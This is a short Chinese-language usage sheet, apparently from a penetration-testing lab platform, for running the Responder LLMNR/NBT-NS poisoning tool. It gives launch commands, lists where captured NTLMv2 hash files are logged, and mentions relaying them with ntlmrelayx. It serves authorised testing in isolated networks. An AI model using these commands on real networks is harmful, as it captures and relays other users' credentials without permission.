## 📦 载荷使用说明：responder_start.sh

该载荷文件主要配合 **Responder** 算子（攻击技法）使用。以下是详细的操作步骤和参数说明。

### 📝 操作步骤

1. **准备阶段**：将本载荷文件通过系统的文件管理功能或光盘摆渡方式上传至目标虚拟机或宿主机指定目录。
2. **执行阶段**：在目标环境中调用 `Responder` 算子，并指定本载荷文件作为配置或脚本输入。
3. **结果验证**：观察执行日志，确认算子执行成功，并根据返回结果进行下一步渗透测试策略的制定。

### ⚙️ 参数说明

以下是本载荷涉及的核心参数及其含义（请根据实际隔离网络环境进行修改）：

**配置示例 1**：
```bash
# 监听所有协议
python3 Responder.py -I eth0 -wrf

# 仅分析模式 (不投毒)
python3 Responder.py -I eth0 -A
```

**配置示例 2**：
```bash
/opt/Responder/logs/
  SMB-NTLMv2-*.txt
  HTTP-NTLMv2-*.txt
```

### 📖 原始工具说明

以下是系统内置的原始工具说明，供参考：

## Responder LLMNR/NBT-NS投毒

### 启动 Responder
```bash
# 监听所有协议
python3 Responder.py -I eth0 -wrf

# 仅分析模式 (不投毒)
python3 Responder.py -I eth0 -A
```

### 捕获的 Hash 位置
```
/opt/Responder/logs/
  SMB-NTLMv2-*.txt
  HTTP-NTLMv2-*.txt
```

- ✓ 被动等待，自动捕获 NTLMv2
- 配合 ntlmrelayx 进行中继攻击
- ⚠ 运行时关闭 SMB/HTTP 服务